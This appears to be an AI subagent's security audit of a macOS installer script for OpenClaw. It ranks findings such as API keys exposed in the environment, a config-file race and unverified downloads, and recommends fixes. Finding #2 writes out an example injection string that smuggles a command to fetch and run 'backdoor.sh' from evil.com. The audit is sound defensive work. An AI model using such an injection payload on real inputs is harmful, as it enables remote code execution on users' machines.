# Security Audit: openclaw-quickstart-v2.sh

**Auditor:** Security Subagent  
**Date:** 2026-02-11  
**Script Version:** 2.3.0  
**Threat Model:** User executes script with normal permissions on personal macOS machine

---

## CRITICAL Issues (fix immediately)

### 1. **API Keys Exposed in Process Environment** (Lines 267-275, 420-422)
**Severity:** CRITICAL  
**Risk:** API keys stored in environment variables are visible to all processes via `ps e` or `/proc`

```bash
export QUICKSTART_OPENROUTER_KEY="$openrouter_key"
export QUICKSTART_ANTHROPIC_KEY="$anthropic_key"
```

**Attack Vector:** Any process running as the same user can read these via `/proc/PID/environ` or `ps`.

**Recommendation:**
- Pass keys via stdin to Python script instead of env vars
- Use process substitution: `python3 - < <(echo "$key")`
- Or write to temp file with `mktemp` and `chmod 600` BEFORE writing content

---

### 2. **Unsafe String Interpolation in Python Heredoc** (Lines 527-596)
**Severity:** CRITICAL  
**Risk:** Command injection via bot name, model name, or other user-controlled variables

```bash
python3 - "$QUICKSTART_DEFAULT_MODEL" "$QUICKSTART_OPENROUTER_KEY" \
         "$QUICKSTART_ANTHROPIC_KEY" "$config_file" "$QUICKSTART_BOT_NAME" ...
```

**Attack Vector:** 
- User inputs bot name: `"; import os; os.system('curl evil.com/backdoor.sh | bash'); "`
- Python script executes arbitrary code

**Recommendation:**
- Validate all inputs before passing to Python (alphanumeric + basic chars only)
- Use JSON for structured data instead of positional args
- Add input sanitization:
  ```bash
  if [[ ! "$bot_name" =~ ^[a-zA-Z0-9\ _-]{1,50}$ ]]; then
      die "Invalid bot name (alphanumeric, spaces, hyphens, underscores only)"
  fi
  ```

---

### 3. **Config File Created Before Permission Lockdown** (Lines 523-594)
**Severity:** CRITICAL  
**Risk:** API keys written to world-readable file, then `chmod 600` applied after

```bash
with open(config_path, 'w') as f:
    json.dump(config, f, indent=2)
```
Then later (line 596):
```bash
chmod 600 "$config_file"
```

**Attack Vector:** Race condition—another process can read config between write and chmod.

**Recommendation:**
- Set umask before creating file: `(umask 077; python3 - ...)`
- Or use `mktemp` with secure permissions, then move atomically

---

### 4. **Unvalidated Template Downloads from GitHub** (Lines 625-650)
**Severity:** CRITICAL  
**Risk:** No integrity verification of downloaded AGENTS.md templates

```bash
curl -fsSL "$agents_url" -o "$workspace_dir/AGENTS.md" 2>/dev/null
```

**Attack Vector:**
- GitHub compromise → malicious AGENTS.md injected
- MITM attack (even with HTTPS, no pinning/checksum)
- Malicious template could execute commands via embedded instructions

**Recommendation:**
- Pin specific commit hashes instead of `main` branch
- Verify checksums (SHA256) of templates
- Review template content before writing (scan for dangerous patterns)
- Use `--fail` to catch HTTP errors explicitly

---

### 5. **LaunchAgent Plist Injection** (Lines 652-675)
**Severity:** HIGH (borderline CRITICAL)  
**Risk:** Unsanitized `$HOME` in plist could enable persistence attacks

```bash
cat > "$launch_agent" << PLISTEOF
<string>$HOME/.openclaw/bin/openclaw</string>
```

**Attack Vector:** If `$HOME` is manipulated (rare but possible in scripted environments), attacker could inject arbitrary plist content.

**Recommendation:**
- Validate `$HOME` exists and is a valid path
- Use absolute paths without expansion where possible
- Escape XML special chars if dynamic content is inserted

---

## HIGH Priority (fix before beta)

### 6. **No Cleanup on Failure** (Entire script)
**Severity:** HIGH  
**Risk:** Partial installations leave behind sensitive data

**Missing:**
- `trap` handler to clean up temp files
- Rollback of partial config writes
- Removal of exported env vars on exit

**Recommendation:**
```bash
trap 'unset QUICKSTART_OPENROUTER_KEY QUICKSTART_ANTHROPIC_KEY; rm -f "$temp_file"' EXIT ERR
```

---

### 7. **Homebrew Install Script Executed Without Review** (Line 106)
**Severity:** HIGH  
**Risk:** Blind trust in `https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh`

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

**Attack Vector:** GitHub compromise, MITM on initial setup

**Recommendation:**
- Display script to user before executing (or offer to)
- Pin to specific commit instead of `HEAD`
- Add checksum verification

---

### 8. **OpenClaw Install Script Curl-to-Bash** (Line 137)
**Severity:** HIGH  
**Risk:** Same as #7—no verification of install.sh from openclaw.ai

```bash
curl -fsSL https://openclaw.ai/install.sh | bash
```

**Recommendation:**
- Download to temp file, display, prompt user to review
- Verify signature or checksum if available
- Use `--fail` flag explicitly

---

### 9. **Gateway Token Displayed in Plaintext** (Line 595)
**Severity:** HIGH (OPSEC issue)  
**Risk:** Token printed to stdout, visible in shell history, tmux scrollback, etc.

```python
print(f"\n  Gateway Token: {gateway_token}")
```

**Recommendation:**
- Write token to secure file instead: `~/.openclaw/.gateway-token` (chmod 600)
- Display instructions on how to retrieve it, not the token itself
- Or encrypt with user password

---

### 10. **No Validation of URL Scheme in `open` Commands** (Lines 173, 738)
**Severity:** HIGH  
**Risk:** Could open malicious URLs if variables are manipulated

```bash
open "https://openrouter.ai/keys" 2>/dev/null
```

**Attack Vector:** If script is modified or variables tampered with, could open `file://` or other schemes.

**Recommendation:**
```bash
validate_https_url() {
    [[ "$1" =~ ^https://[a-zA-Z0-9.-]+/[a-zA-Z0-9/_-]*$ ]] || die "Invalid URL"
}
```

---

## MEDIUM Priority (address soon)

### 11. **No Input Length Limits** (Lines 41-67)
**Severity:** MEDIUM  
**Risk:** Denial of service via extremely long inputs

**Recommendation:**
- Limit input length in `prompt()` function
- Validate before storing in variables

---

### 12. **Insufficient Validation of User Choices** (Lines 221-238, 290-321)
**Severity:** MEDIUM  
**Risk:** Invalid choices could cause unexpected behavior

**Example:** User enters `999` for setup choice—no validation against valid range.

**Recommendation:**
```bash
while [[ ! "$setup_choice" =~ ^[1-3]$ ]]; do
    setup_choice=$(prompt "Choose 1-3" "2")
done
```

---

### 13. **Duplicate Skill Pack Detection Insufficient** (Lines 426-483)
**Severity:** MEDIUM  
**Risk:** Multiple runs can append duplicate content to AGENTS.md

**Current Check:**
```bash
if grep -q "QUALITY_PACK_INSTALLED" "$workspace_dir/AGENTS.md" 2>/dev/null; then
    warn "Quality Pack already installed, skipping"
```

**Issue:** Check happens AFTER file is created, could miss edge cases.

**Recommendation:**
- Add mutex/lock file during installation
- Use atomic file operations (write to temp, then move)

---

### 14. **No Verification of Template Download Success** (Lines 625-650)
**Severity:** MEDIUM  
**Risk:** Silent failure if template download fails

**Recommendation:**
- Check HTTP response code
- Validate downloaded file is valid Markdown (basic sanity check)
- Don't silently continue on failure—notify user

---

### 15. **Broad Error Suppression** (Throughout)
**Severity:** MEDIUM  
**Risk:** `2>/dev/null` and `|| true` hide important errors

**Examples:**
- Line 113: `brew link --overwrite node@22 &>/dev/null || true`
- Line 399: `brew tap steipete/tap 2>/dev/null || true`

**Recommendation:**
- Only suppress expected/harmless errors
- Log suppressed errors for debugging
- Use `|| warn "X failed but continuing"`

---

### 16. **No Rate Limiting on Network Requests**
**Severity:** MEDIUM  
**Risk:** Rapid retries could trigger rate limits or appear as attack

**Recommendation:**
- Add exponential backoff for failed downloads
- Limit retry attempts (max 3)

---

## LOW Priority (nice to have)

### 17. **Spinner Function Could Mask Errors** (Lines 69-81)
**Severity:** LOW  
**Risk:** Background process failures not immediately visible

**Recommendation:**
- Check exit status after spinner completes
- Display error if background job failed

---

### 18. **Hard-coded GitHub URLs** (Line 614)
**Severity:** LOW  
**Risk:** Supply chain dependency on specific GitHub repo

```bash
local base_url="https://raw.githubusercontent.com/jeremyknows/clawstarter/main"
```

**Recommendation:**
- Allow override via environment variable
- Document dependency in README
- Consider mirroring critical files

---

### 19. **No Logging of Security-Relevant Actions**
**Severity:** LOW  
**Risk:** Difficult to audit what script did after the fact

**Recommendation:**
- Log to `~/.openclaw/install.log`:
  - API key types configured
  - Templates installed
  - Skill packs added
  - Permissions set

---

### 20. **Insufficient Gateway Health Check** (Lines 680-684)
**Severity:** LOW  
**Risk:** `pgrep -f "openclaw"` could match unrelated processes

```bash
if pgrep -f "openclaw" &>/dev/null; then
    pass "Gateway running"
```

**Recommendation:**
- Check specific PID from launchd
- Verify HTTP endpoint responds: `curl -s http://127.0.0.1:18789/health`

---

## PASS (good practices)

✅ **Strict error handling** (`set -euo pipefail`) — Line 9  
✅ **File permission lockdown** (`chmod 600`) on config — Line 596  
✅ **Backup existing config** before overwrite — Lines 515-518  
✅ **Readonly constants** for version, ports — Lines 11-13  
✅ **User confirmation** for destructive actions — `confirm()` function  
✅ **Detailed user guidance** for API key signup — Lines 149-168  
✅ **Graceful degradation** to free tier if no key — Lines 195-199  
✅ **Secure token generation** using `secrets.token_hex(32)` — Line 535  
✅ **Workspace isolation** (`~/.openclaw/workspace`) — Good boundary  
✅ **LaunchAgent for persistence** instead of cron — More macOS-native  

---

## Verdict

**🔴 BLOCK RELEASE — FIX CRITICAL FIRST**

### Summary
This script has **5 critical vulnerabilities** that must be fixed before public release:

1. **API keys in process env** → Switch to file-based passing
2. **Python injection risk** → Validate all user inputs
3. **Config file race condition** → Use umask or secure temp files
4. **Unverified template downloads** → Add checksums/commit pinning
5. **LaunchAgent injection risk** → Validate paths

### Estimated Fix Time
- **Critical issues:** 2-4 hours
- **High priority:** 4-6 hours
- **Total before beta release:** 6-10 hours of focused work

### Recommended Action Plan
1. **Immediate:** Fix Critical #1-3 (API key handling, injection, race condition)
2. **Before beta:** Fix Critical #4-5 + High #6-10
3. **Before 1.0:** Address Medium priority issues
4. **Post-launch:** Low priority improvements

### Risk Assessment
**Current state:** If released as-is, this script poses significant risks:
- API key theft by malicious processes
- Arbitrary code execution via crafted inputs
- Supply chain attacks via unverified downloads

**After fixes:** Medium risk (inherent trust in Homebrew/npm ecosystem remains)

---

## Additional Recommendations

### Defense in Depth
1. **Add a `--dry-run` mode** to show what would be done without executing
2. **Checksum verification** for all downloaded files
3. **Sandboxing** for the Python script execution
4. **Audit log** of all file modifications and network requests

### User Education
Include warnings in the script output:
- "This script will download and execute code from GitHub"
- "Review the script before running: less openclaw-quickstart-v2.sh"
- "API keys will be stored in ~/.openclaw/openclaw.json"

### Code Signing
Consider signing the script with GPG so users can verify authenticity before running.

---

**End of Audit**
